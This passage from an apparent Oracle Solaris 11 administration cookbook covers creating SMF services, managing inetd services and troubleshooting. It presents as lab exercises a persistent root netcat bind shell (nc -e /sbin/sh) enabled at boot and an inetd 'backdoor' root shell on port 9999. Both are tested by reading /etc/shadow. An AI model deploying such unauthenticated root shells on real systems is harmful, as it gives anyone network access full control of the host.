    <instance name='default' enabled='true'/>
  </service>

(truncated output)

```

A service can be configured and its behavior can be customized using different methods; additionally, it is very important to know where the SMF framework reads its properties from. Therefore, the directory and files where the SMF gathers properties of a service are as follows:

*   `manifest`: This gets properties from the `/lib/svc/manifest` or `/var/svc/manifest` directories
*   `site-profile`: This gets properties from the `/etc/svc/profile/site` directory or the `site.xml` profile file under `/etc/svc/profile/`

### An overview of the recipe

In this section, you saw many details about profiles and manifests such as their elements and available types. All these concepts are going to be deployed in the next section.

# Creating SMF services

This time, we are going to create a new service in Oracle Solaris 11, and the chosen application is gedit, which is a graphical editor. It is obvious that we can show the same procedure using any application and we will only need to make the necessary alterations to adapt the example.

## Getting ready

This recipe requires a virtual machine (VirtualBox or VMware) with Oracle Solaris 11 installed and 4 GB RAM.

## How to do it…

The first step is to create a script that starts and stops the application that we are interested in. There are several scripts in `/lib/svc/method` and we could use one of them as a template, but I have used a very basic model, as follows:

```
root@solaris11-1:~/chapter5# vi gedit_script.sh 
#!/sbin/sh
. /lib/svc/share/smf_include.sh
case "$1" in 
'start')
DISPLAY=:0.0
export DISPLAY
/usr/bin/gedit &
;;
'stop')
pkill -x -u 0 gedit
;;
*)
echo $"Usage: $0 {start|stop}"
exit 1
;;

esac
exit $SMF_EXIT_OK
```

This script is simple and good, but we need to change its permissions and copy it to the `method` directory under `/lib/svc/`, which is the default place for service scripts. This task can be accomplished as follows:

```
root@solaris11-1:~/chapter5# chmod u+x gedit_script.sh 
root@solaris11-1:~/chapter5# more gedit_script.sh

```

In the next step, we are going to create a manifest, but as this task is very complicated when starting from scratch, we can take a manifest from another existing service and copy it to the home directory. Afterwards, we have to make appropriate changes to adapt it to achieve our goal, as shown:

```
root@solaris11-1:~# cp /lib/svc/manifest/system/cron.xml /root/chapter5/gedit_script_Manifest.xml
root@solaris11-1:~# cd /root/chapter5
root@solaris11-1:~/chapter5# vi gedit_script_Manifest.xml
<?xml version="1.0"?>
<!DOCTYPE service_bundle SYSTEM "/usr/share/lib/xml/dtd/service_bundle.dtd.1">
<!--
 Copyright 2009 Sun Microsystems, Inc.  All rights reserved.
 Use is subject to license terms.

    NOTE:  This service manifest is not editable; its contents will
    be overwritten by package or patch operations, including
    operating system upgrade.  Make customizations in a different
    file.
-->

<service_bundle type='manifest' name='gedit_script'>

<service
  name='application/gedit_script'
  type='service'
  version='1'>

  <single_instance />

  <dependency
    name='milestone'
    type='service'
    grouping='require_all'
    restart_on='none'>
 <service_fmri value='svc:/milestone/multi-user' />
  </dependency>

  <exec_method
    type='method'
    name='start'
    exec='/lib/svc/method/gedit_script.sh start'
 timeout_seconds='120'>
    <method_context>
      <method_credential user='root' group='root' />
    </method_context>
  </exec_method>

  <exec_method
    type='method'
    name='stop'
    exec='/lib/svc/method/gedit_script.sh stop'
 timeout_seconds='120'>
  </exec_method>

  <property_group name='startd' type='framework' >
 <propval name='duration' type='astring' value='transient' />
 </property_group>

  <instance name='default' enabled='false' />

  <stability value='Unstable' />

  <template>
    <common_name>
      <loctext xml:lang='C'>
      graphical editor (gedit)
      </loctext>
    </common_name>
    <documentation>
 <manpage title='gedit' section='1' manpath='/usr/share/man' />
    </documentation>
  </template>
</service>

</service_bundle>
```

That's a long XML file, but it's easy. Some points deserve an explanation:

*   The service name is `gedit_script` as seen in the following line:

    ```
    name='application/gedit_script'
    ```

*   The service depends on the `milestone` multiuser, as seen in the following snippet:

    ```
    <dependency
        name='milestone'
        type='service'
        grouping='require_all'
        restart_on='none'>
        <service_fmri value='svc:/milestone/multi-user' />
    </dependency>
    ```

*   The time limit to start and stop the service is `120` seconds as seen in the following snippet:

    ```
    <exec_method
        type='method'
        name='start'
        exec='/lib/svc/method/gedit_script.sh start'
     timeout_seconds='120'>
        <method_context>
          <method_credential user='root' group='root' />
        </method_context>
      </exec_method>
    <exec_method
        type='method'
        name='stop'
        exec='/lib/svc/method/gedit_script.sh stop'
     timeout_seconds='120'>
      </exec_method>
    ```

*   The `<property_group>` section configures the service as an old service type (`transient`) to prevent the SMF from automatically restarting `gedit_script` if it fails, as seen in the following snippet:

    ```
    <property_group name='startd' type='framework' >
      <propval name='duration' type='astring' value='transient' />
      </property_group>
    ```

*   The service's default status is disabled, as seen in the following line:

    ```
    <instance name='default' enabled='false' />
    ```

It is time to verify if this manifest has a syntax error before trying to import it. Therefore, execute the following command:

```
root@solaris11-1:~/chapter5# svccfg validate gedit_script_Manifest.xml

```

So far, everything sounds good. Therefore, we can import the manifest in the repository by running the following command:

```
root@solaris11-1:~/chapter5# svccfg import gedit_script_Manifest.xml

```

### Note

The previous command is a key command because every time a modification is made in the manifest, we have to run this command to update the repository with new configurations.

If there was no error, the service should appear among other services, as follows:

```
root@solaris11-1:~/chapter5# svcs -a | grep gedit
disabled        3:50:02 svc:/application/gedit_script:default
```

That's nice! It's time to start the service and the gedit editor (a graphical editor) must come up (remember that we've made a script named `gedit_script.sh` to start the `gedit` editor) after executing the second command:

```
root@solaris11-1:~# xhost +
access control disabled, clients can connect from any host
root@solaris11-1:~# svcadm enable svc:/application/gedit_script:default
root@solaris11-1:~# svcs -a | grep gedit
online         15:03:19 svc:/application/gedit_script:default
root@solaris11-1:~#
```

The properties from this new service are shown by executing the following command:

```
root@solaris11-1:~# svcprop svc:/application/gedit_script:default
general/complete astring 
general/enabled boolean false
general/entity_stability astring Unstable
general/single_instance boolean true
milestone/entities fmri svc:/milestone/multi-user
milestone/grouping astring require_all
milestone/restart_on astring none
milestone/type astring service
manifestfiles/root_chapter5_gedit_script_Manifest_xml astring /root/chapter5/gedit_script_Manifest.xml
startd/duration astring transient
start/exec astring /lib/svc/method/gedit_script.sh\ start
start/group astring root
start/timeout_seconds count 120
start/type astring method
start/use_profile boolean false
start/user astring root
stop/exec astring /lib/svc/method/gedit_script.sh\ stop
stop/timeout_seconds count 120
stop/type astring method
tm_common_name/C ustring graphical\ editor\ \(gedit\)
tm_man_gedit1/manpath astring /usr/share/man
tm_man_gedit1/section astring 1
tm_man_gedit1/title astring gedit
restarter/logfile astring /var/svc/log/application-gedit_script:default.log
restarter/start_pid count 8097
restarter/start_method_timestamp time 1394042599.387615000
restarter/start_method_waitstatus integer 0
restarter/transient_contract count 
restarter/auxiliary_state astring dependencies_satisfied
restarter/next_state astring none
restarter/state astring online
restarter/state_timestamp time 1394042599.397622000
restarter_actions/refresh integer 
restarter_actions/auxiliary_tty boolean true
restarter_actions/auxiliary_fmri astring svc:/application/graphical-login/gdm:default
```

To list the environment variables associated with the `gedit_script` service, execute the following command:

```
root@solaris11-1:~# pargs -e `pgrep -f gedit_script`
7919:  tail -f /var/svc/log/application-gedit_script:default.log
envp[0]: ORBIT_SOCKETDIR=/var/tmp/orbit-root
envp[1]: SSH_AGENT_PID=6312
envp[2]: TERM=xterm
envp[3]: SHELL=/usr/bin/bash
envp[4]: XDG_SESSION_COOKIE=f8114f3c252db0743fd58c3e0000009e-1394035066.410005-1956267226
envp[5]: GTK_RC_FILES=/etc/gtk/gtkrc:/root/.gtkrc-1.2-gnome2
envp[6]: WINDOWID=31457283
(truncated output)

```

Finally, to stop the `gedit_script` service and to verify that everything happens as expected, execute the following commands:

```
root@solaris11-1:~# svcadm disable gedit_script
root@solaris11-1:~# svcs -a | grep gedit
disabled       15:26:35 svc:/application/gedit_script:default
```

Great! Everything works! Now let's talk about profiles.

**Profiles** are also very important, and they determine which services will be started during the boot process. Therefore, it is appropriate to adapt them to start only the necessary services in order to reduce the attack surface against a hacker.

The following steps create a new service (more interesting than the `gedit_script` service) using the great `netcat` tool (`nc`). The steps will be the same as those used previously. For remembrance sake, consider the following steps:

1.  Create a script.
2.  Make it executable.
3.  Copy it to `/lib/svc/method`.
4.  Create a manifest for the service.
5.  Validate the manifest.
6.  Import the manifest.
7.  List the service.
8.  Start the service.
9.  Test the service.
10.  Stop the service.

The following is the sequence of commands to create a new service. According to our previous list, the first step is to create a script to start and stop the service, as follows:

```
root@solaris11-1:~/chapter5# vi netcat.sh
#!/sbin/sh
. /lib/svc/share/smf_include.sh

case "$1" in 
'start')
/usr/bin/nc -D -d -l -p 6666 -e /sbin/sh &
;;
'stop')
pkill -x -u 0 netcat
;;
*)
echo $"Usage: $0 {start/stop}"
exit 1
;;
esac
exit $SMF_EXIT_OK
```

Grant the execution permission to the script and copy it to the appropriate directory where all other scripts from existing services are present, as follows:

```
root@solaris11-1:~/chapter5# chmod u+x netcat.sh
root@solaris11-1:~/chapter5# cp netcat.sh /lib/svc/method/

```

The next step is to create a manifest for the service (`netcat`). It will be easier to copy the manifest from an existing service and adapt it, as follows:

```
root@solaris11-1:~/chapter5# vi netcat_manifest.xml
<?xml version="1.0"?>
<!DOCTYPE service_bundle SYSTEM "/usr/share/lib/xml/dtd/service_bundle.dtd.1">
<!--
 Copyright 2009 Sun Microsystems, Inc.  All rights reserved.
 Use is subject to license terms.

    NOTE:  This service manifest is not editable; its contents will
    be overwritten by package or patch operations, including
    operating system upgrade.  Make customizations in a different
    file.
-->

<service_bundle type='manifest' name='netcat'>

<service
  name='application/netcat'
  type='service'
  version='1'>

  <single_instance />

  <dependency
    name='milestone'
    type='service'
    grouping='require_all'
    restart_on='none'>
    <service_fmri value='svc:/milestone/multi-user' />
  </dependency>

  <exec_method
    type='method'
    name='start'
    exec='/lib/svc/method/netcat.sh start'
    timeout_seconds='120'>
    <method_context>
      <method_credential user='root' group='root' />
    </method_context>
  </exec_method>

  <exec_method
    type='method'
    name='stop'
    exec='/lib/svc/method/netcat.sh stop'
    timeout_seconds='120'>
  </exec_method>

  <property_group name='startd' type='framework' >
  <propval name='duration' type='astring'  value='transient' />
  </property_group>

  <instance name='default' enabled='false' />

  <stability value='Unstable' />

  <template>
    <common_name>
      <loctext xml:lang='C'>
      hacker tool (nc)
      </loctext>
    </common_name>
    <documentation>
      <manpage title='nc' section='1' manpath='/usr/share/man' />
    </documentation>
  </template>
</service>

</service_bundle>
```

Before continuing, we have to validate the `netcat_manifest.xml` manifest, and after this step, we can import the manifest into the service repository, as shown in the following commands:

```
root@solaris11-1:~/chapter5# svccfg validate netcat_manifest.xml
root@solaris11-1:~/chapter5# svccfg import netcat_manifest.xml

```

To verify that the service was correctly imported, check whether it appears in the SMF service list by running the following command:

```
root@solaris11-1:~/chapter5# svcs -a | grep netcat
disabled       18:56:09 svc:/application/netcat:default
root@solaris11-1:~/chapter5# svcadm enable svc:/application/netcat:default
root@solaris11-1:~/chapter5# svcs -a | grep netcat
online         19:14:17 svc:/application/netcat:default
```

To collect other details about the `netcat` service, execute the following command:

```
root@solaris11-1:~/chapter5# svcs -l svc:/application/netcat:default
fmri         svc:/application/netcat:default
name         hacker tool (nc)
enabled      true
state        online
next_state   none
state_time   March  5, 2014 07:14:17 PM BRT
logfile      /var/svc/log/application-netcat:default.log
restarter    svc:/system/svc/restarter:default
contract_id  
manifest     /root/chapter5/netcat_manifest.xml
dependency   require_all/none svc:/milestone/multi-user (online)

root@solaris11-1:~/chapter5# svcs -xv svc:/application/netcat:default
svc:/application/netcat:default (hacker tool (nc))
 State: online since March  5, 2014 07:14:17 PM BRT
   See: man -M /usr/share/man -s 1 nc
   See: /var/svc/log/application-netcat:default.log
Impact: None.
```

The specific `netcat service` log can be examined to check whether there's any problem by running the following command:

```
root@solaris11-1:~/chapter5# tail -f /var/svc/log/application-netcat:default.log
(truncated output)
[ Mar  5 19:14:16 Enabled. ]
[ Mar  5 19:14:17 Executing start method ("/lib/svc/method/netcat.sh start"). ]
[ Mar  5 19:14:17 Method "start" exited with status 0\. ]
```

To test whether our new service is indeed working, run the following command:

```
root@solaris11-1:~/chapter5# nc localhost 6666
pwd
/root
cd /
pwd
/
cat /etc/shadow
root:$5$oXrpLA3o$UTJJeO.MfjlTBGzJI.yzhHvqhvW.xUWBknpCKHRvP79:16131::::::22560
daemon:NP:6445::::::
bin:NP:6445::::::
sys:NP:6445::::::
adm:NP:6445::::::
lp:NP:6445::::::
(truncated output)

```

That's amazing!

We have to check whether the `netcat` service is able to stop in an appropriate way by executing the following commands:

```
root@solaris11-1:~/chapter5# svcadm disable netcat
root@solaris11-1:~/chapter5# svcs -a | grep netcat
disabled       19:27:14 svc:/application/netcat:default
```

The logfile from the service can be useful to check the service status, as follows:

```
root@solaris11-1:~/chapter5# tail -f /var/svc/log/application-netcat:default.log
 [ Mar  5 19:14:16 Enabled. ]
[ Mar  5 19:14:17 Executing start method ("/lib/svc/method/netcat.sh start"). ]
[ Mar  5 19:14:17 Method "start" exited with status 0\. ]
^X[ Mar  5 19:27:14 Stopping because service disabled. ]
[ Mar  5 19:27:14 Executing stop method ("/lib/svc/method/netcat.sh stop"). ]
[ Mar  5 19:27:14 Method "stop" exited with status 0\. ]
```

So far everything has worked! The next step is to extract the current active SMF profile and to modify it in order to enable the `netcat` service (`<create_default_instance enabled='true'/>`) now and during the system boot. To accomplish this task, execute the following commands:

```
root@solaris11-1:~/chapter5# svccfg extract > myprofile.xml
root@solaris11-1:~/chapter5# vi myprofile.xml
<?xml version='1.0'?>
<!DOCTYPE service_bundle SYSTEM '/usr/share/lib/xml/dtd/service_bundle.dtd.1'>
<service_bundle type='profile' name='profile'>

(truncated output)

<service name='application/netcat' type='service' version='0'>
    <create_default_instance enabled='true'/>
    <single_instance/>
    <dependency name='milestone' grouping='require_all' restart_on='none' type='service'>
      <service_fmri value='svc:/milestone/multi-user'/>
    </dependency>
    <exec_method name='start' type='method' exec='/lib/svc/method/netcat.sh start' timeout_seconds='120'>
      <method_context>
        <method_credential user='root' group='root'/>
      </method_context>
    </exec_method>
    <exec_method name='stop' type='method' exec='/lib/svc/method/netcat.sh stop' timeout_seconds='120'/>
    <property_group name='startd' type='framework'>
      <propval name='duration' type='astring' value='transient'/>
    </property_group>
    <stability value='Unstable'/>
    <template>
      <common_name>
        <loctext xml:lang='C'>hacker tool (nc)</loctext>
      </common_name>
      <documentation>
        <manpage title='nc' section='1' manpath='/usr/share/man'/>
      </documentation>
    </template>
```

The process of importing and validating must be repeated again (this time for the profile) by running the following commands:

```
root@solaris11-1:~/chapter5# svccfg validate myprofile.xml
root@solaris11-1:~/chapter5# svccfg import my profile.xml

```

Check the status of the `netcat` service again by executing the following command:

```
root@solaris11-1:~/chapter5# svcs -a | grep netcat
online         19:52:18 svc:/application/netcat:default
```

This is unbelievable! The `netcat` service was configured to `enabled` in the profile and it was brought to the `online` state. If we reboot the system, we're going to see the following output:

```
root@solaris11-1:~# svcs -a | grep netcat
online         20:02:50 svc:/application/netcat:default
root@solaris11-1:~# svcs -l netcat
fmri         svc:/application/netcat:default
name         hacker tool (nc)
enabled      true
state        online
next_state   none
state_time   March  5, 2014 08:02:50 PM BRT
logfile      /var/svc/log/application-netcat:default.log
restarter    svc:/system/svc/restarter:default
manifest     /root/chapter5/netcat_manifest.xml
manifest     /root/chapter5/myprofile.xml
dependency   require_all/none svc:/milestone/multi-user (online)
```

Both the XML files (the manifest and the profile) are shown in the output.

### An overview of the recipe

A new service was created by performing all the usual steps, such as creating the start/stop script, creating a manifest, importing it, and running the service. Furthermore, you learned how to modify a profile automatically to start a service during the Oracle Solaris 11 boot phase.

# Administering inetd-controlled network services

In Oracle Solaris 11, there are services that are out of the SMF context and they are controlled by another (and old) daemon: inetd. Inetd is the official restarter of these network services and, during the tasks where we are managing them, the main command to accomplish all tasks is `inetadm`. It is time to see how this works.

## Getting ready

This procedure requires a virtual machine (using VirtualBox or VMware) running Oracle Solaris 11 and with 4 GB RAM.

## How to do it…

Initially, there are a few interesting services to play with. Therefore, we have to install a good service: `telnet`. Execute the following command:

```
root@solaris11-1:~# pkg install pkg://solaris/service/network/telnet

```

To list the existing inetd services, execute the following commands:

```
root@solaris11-1:~# inetadm
ENABLED   STATE          FMRI
disabled  disabled       svc:/application/cups/in-lpd:default
disabled  disabled       svc:/application/x11/xfs:default
disabled  disabled       svc:/application/x11/xvnc-inetd:default
disabled  disabled       svc:/network/comsat:default
disabled  disabled       svc:/network/stdiscover:default
disabled  disabled       svc:/network/rpc/spray:default
enabled   online         svc:/network/rpc/smserver:default
enabled   online         svc:/network/rpc/gss:default
disabled  disabled       svc:/network/rpc/rex:default
disabled  disabled       svc:/network/nfs/rquota:default
enabled   online         svc:/network/security/ktkt_warn:default
disabled  disabled       svc:/network/stlisten:default
disabled  disabled       svc:/network/telnet:default
```

The old and good `inetd.conf` still exists, but it does not have any relevant content for network service configuration anymore (all lines are commented):

```
root@solaris11-1:~# more /etc/inet/inetd.conf
#
# Copyright 2004 Sun Microsystems, Inc.  All rights reserved.
# Use is subject to license terms.
#
#ident  "%Z%%M%  %I%  %E% SMI"
#
# Legacy configuration file for inetd(1M).  See inetd.conf(4).
#
# This file is no longer directly used to configure inetd.
# The Solaris services which were formerly configured using this file
# are now configured in the Service Management Facility (see smf(5))
# using inetadm(1M).
#
# Any records remaining in this file after installation or upgrade,
# or later created by installing additional software, must be converted
# to smf(5) services and imported into the smf repository using
# inetconv(1M), otherwise the service will not be available.  Once
# a service has been converted using inetconv, further changes made to
# its entry here are not reflected in the service.
#
```

To collect more details about the `telnet` service that we have just installed, it is necessary to run the following command:

```
root@solaris11-1:~# inetadm -l svc:/network/telnet:default
SCOPE    NAME=VALUE
         name="telnet"
         endpoint_type="stream"
         proto="tcp6"
         isrpc=FALSE
         wait=FALSE
         exec="/usr/sbin/in.telnetd"
         user="root"
default  bind_addr=""
default  bind_fail_max=-1
default  bind_fail_interval=-1
default  max_con_rate=-1
default  max_copies=-1
default  con_rate_offline=-1
default  failrate_cnt=40
default  failrate_interval=60
default  inherit_env=TRUE
default  tcp_trace=FALSE
default  tcp_wrappers=FALSE
default  connection_backlog=10
default  tcp_keepalive=FALSE
```

To enable the `telnet` service, run the following commands:

```
root@solaris11-1:~# inetadm -e svc:/network/telnet:default
root@solaris11-1:~# inetadm | grep telnet
enabled   online         svc:/network/telnet:default
```

As the `telnet` service has several attributes, it is feasible to change them, for example, during a troubleshooting session. For example, in order to enable the `telnet` service to log all its records to the `syslog` service, execute the following commands:

```
root@solaris11-1:~# inetadm -m  svc:/network/telnet:default tcp_trace=true
root@solaris11-1:~# inetadm -l telnet | grep tcp_trace
         tcp_trace=TRUE
```

This is great! We can disable the `telnet` service when it isn't required anymore:

```
root@solaris11-1:~# inetadm -d svc:/network/telnet:default
root@solaris11-1:~# inetadm | grep telnet
disabled  disabled       svc:/network/telnet:default
```

Good! It is time to learn another very interesting and unusual trick in our next example.

Now, our goal is to create a very simple backdoor as a service in the old `inetd.conf` file under `/etc/inet/` and to convert it to SMF. How can we do this? Easy! The first step is to create a service line in the `inetd.conf` file under `/etc/inet/` by running the following command:

```
root@solaris11-1:~# vi /etc/inet/inetd.conf

(truncated output)
backdoor  stream  tcp6  nowait  root  /sbin/sh  /sbin/sh -a
```

Since we have created the mentioned line in the `inetd.conf` file, we have to assign a TCP port to this service in the `/etc/services` file (the last line) by executing the following command:

```
root@solaris11-1:~# vi /etc/services
(truncated output)
backdoor  9999/tcp      # backdoor
```

There is a command named `inetconf` that converts an INET service to an SMF service easily:

```
root@solaris11-1:~# inetconv
backdoor -> /lib/svc/manifest/network/backdoor-tcp6.xml
Importing backdoor-tcp6.xml ...svccfg: Restarting svc:/system/manifest-import
```

To verify that the service was converted to the SMF model as expected, execute the following command:

```
root@solaris11-1:~# svcs -a | grep backdoor
online         20:36:15 svc:/network/backdoor/tcp6:default
```

Finally, to test whether the backdoor service is working, execute the following command:

```
root@solaris11-1:~# nc localhost 9999
ls
chapter5
core
Desktop
Documents
Downloads
Public
cd /
pwd
/
grep root /etc/shadow
root:$5$oXepLA3w$UTJJeO.MfVl1BGzJI.yzhHvqhvq.xUWBknCCKHRvP79:16131::::::22560
```

That's wonderful! The backdoor service is working well!

Going further, Oracle Solaris 11 offers a command named `netservice` that opens or closes most network services (except the `ssh` service) for any remote access by applying the `generic_limited_net.xml` profile and configuring the local-only mode attribute from some services. I suggest that you take some time to examine this profile.

Using the `netservices` command to close most network services for remote access is easy and can be done by running the following command:

```
root@solaris11-1:~# netservices limited
restarting svc:/system/system-log:default
restarting svc:/network/smtp:sendmail
```

To reverse the status (enabled or disabled) of each network service, run the following command:

```
root@solaris11-1:~# netservices open
restarting svc:/system/system-log:default
restarting svc:/network/smtp:sendmail
```

### An overview of the recipe

You learned how to administer inetd services as well as how to create and transform an inetd service into an SMF service. The main commands in this section were `inetadm` and `inetconv`.

# Troubleshooting Oracle Solaris 11 services

In this last section of the chapter, you're going to learn how to troubleshoot a service that's presenting an error and how to fix a corrupted repository.

## Getting ready

To following the recipe, it'll be necessary to have a virtual machine (using VirtualBox or VMware) with Oracle Solaris 11 installed and 4 GB RAM.

## How to do it…

The main role of an administrator is to keep everything working well. The best way to analyze the system is by running the following command:

```
root@solaris11-1:~# svcs –xv

```

For now, there isn't a problem in the system, but we can simulate one. For example, in the next step, we will break the `gedit_script` service by taking out a semicolon from its script, as follows:

```
root@solaris11-1:~# vi /lib/svc/method/gedit_script.sh
#!/sbin/sh
. /lib/svc/share/smf_include.sh
case "$1" in
'start')
DISPLAY=:0.0
export DISPLAY
/usr/bin/gedit &
;-----------------à Remove this semicolon!
'stop')
pkill -x -u 0 gedit
;;
*)
echo $"Usage: $0 {start|stop}"
exit 1
;;

esac
exit $SMF_EXIT_OK
```

To continue the procedure, the `gedit_script` service will be disabled and enabled again by executing the following commands:

```
root@solaris11-1:~# svcadm disable svc:/application/gedit_script:default
root@solaris11-1:~# svcs -a | grep gedit_script
disabled        0:22:13 svc:/application/gedit_script:default
root@solaris11-1:~# svcadm enable svc:/application/gedit_script:default
You have new mail in /var/mail/root
root@solaris11-1:~# svcs -a | grep gedit_script
maintenance     0:29:13 svc:/application/gedit_script:default
```

According to the previous three outputs, we broke the service and started it again quickly, so it has entered the maintenance state. To collect more information about the service in order to focus on the possible cause, execute the following command:

```
root@solaris11-1:~# svcs -xv svc:/application/gedit_script:default
svc:/application/gedit_script:default (graphical editor (gedit))
 State: maintenance since March  6, 2014 12:29:13 AM BRT
Reason: Start method failed repeatedly, last exited with status 3.
   See: http://support.oracle.com/msg/SMF-8000-KS
   See: man -M /usr/share/man -s 1 gedit
   See: /var/svc/log/application-gedit_script:default.log
Impact: This service is not running.
```

The service isn't running and there are more details from its logfile, as shown:

```
root@solaris11-1:~# tail -f /var/svc/log/application-gedit_script:default.log
[ Mar  6 00:29:13 Enabled. ]
[ Mar  6 00:29:13 Executing start method ("/lib/svc/method/gedit_script.sh start"). ]
/lib/svc/method/gedit_script.sh: line 2: syntax error at line 9: `)' unexpected
[ Mar  6 00:29:13 Method "start" exited with status 3\. ]
```

That's fantastic! The Oracle Solaris 11 SMF framework describes the exact line where the error has occurred. To repair the problem, we must fix the broken line (by adding a `;` again where we removed it from) and restore the service to the `online` state. Then, after fixing the syntax problem, run the following commands:

```
root@solaris11-1:~# svcadm clear svc:/application/gedit_script:default
root@solaris11-1:~# svcs -a | grep gedit_script
online          0:39:12 svc:/application/gedit_script:default
```

That's perfect! The service has come to the online state again!

Going to the last topic, the SMF repository is accessed through the `svc.configd` daemon and it's the daemon that controls every read/write operation to the service repository. Furthermore, `svc.configd` also checks the repository integrity when it starts. Corruption in the repository is rare, but it can happen and in this case, we can repair it with the system either in the online or in the maintenance mode (through the `sulogin` command). To fix the repository, run the following command;

```
root@solaris11-1:~# /lib/svc/bin/restore_repository

```

Take a look at [http://support.oracle.com/msg/SMF-8000-MY](http://support.oracle.com/msg/SMF-8000-MY) for more information on the use of this script to restore backup copies of the `smf(5)` repository.

If there are any problems that need human intervention, this script will give instructions and then exit back to your shell:

```
/lib/svc/bin/restore_repository[71]: [: /: arithmetic syntax error
The following backups of /etc/svc/repository.db exist, from
Oldest to newest:

manifest_import-20140117_072325
boot-20140305_132432
manifest_import-20140305_170246
manifest_import-20140305_170535
boot-20140305_180217
boot-20140305_200130
manifest_import-20140305_203615
boot-20140306_005602
```

The backups are named based on their types and on the time when they were taken. Backups beginning with `boot` are made before the first change is made to the repository after the system boot. Backups beginning with `manifest_import` are made after `svc:/system/manifest-import:default` finishes its processing.

The time of backup is given in the `YYYYMMDD_HHMMSS` format.

Please enter either a specific backup repository from the previous list to restore it or select one of the following choices:

```
  CHOICE      ACTION
  ----------------  ----------------------------------------------
  boot      restore the most recent post-boot backup
  manifest_import    restore the most recent manifest_import backup
  -seed-      restore the initial starting repository  (All
          customizations will be lost, including those
          made by the install/upgrade process.)
  -quit-      cancel script and quit

Enter response [boot]:
```

Before choosing an option, you must know which repository backup types exist in the system:

*   `boot-<timestamp>`: In `boot-<timestamp>`, backups are made after a system boots but before any change is made.
*   `manifest_import-<timestamp>`: In `manifest_import-<timestamp>`, backups are made after `svc:/system/manifest-import:default` is executed.
*   `--seed--`: This restores the initial repository. If we restore this backup, every service or change that was done will be lost!

In this case, we're going to pick the `boot` option, as shown:

```
Enter response [boot]: boot
After confirmation, the following steps will be taken:

svc.startd(1M) and svc.configd(1M) will be quiesced, if running.
/etc/svc/repository.db
    -- renamed --> /etc/svc/repository.db_old_20140306_011224
/etc/svc/repository-boot
    -- copied --> /etc/svc/repository.db 
and the system will be rebooted with reboot(1M).

Proceed [yes/no]? yes

```

After the system rebooting, the system comes online again and everything works well!

### An overview of the recipe

In this chapter, you learned how to find a service error using `svcs –xv <fmri>` to correct it, to bring the service online again (`svcadm clear <fmri>`), and in extreme cases, to restore the repository using the `/lib/svc/bin/restore_repository` command.

# References

*   *Oracle Solaris Administration: Common Tasks* at [http://docs.oracle.com/cd/E23824_01/pdf/821-1451.pdf](http://docs.oracle.com/cd/E23824_01/pdf/821-1451.pdf)
*   *Oracle Solaris 11* *Administrator's Cheat Sheet* at [http://www.oracle.com/technetwork/server-storage/solaris11/documentation/solaris-11-cheat-sheet-1556378.pdf](http://www.oracle.com/technetwork/server-storage/solaris11/documentation/solaris-11-cheat-sheet-1556378.pdf)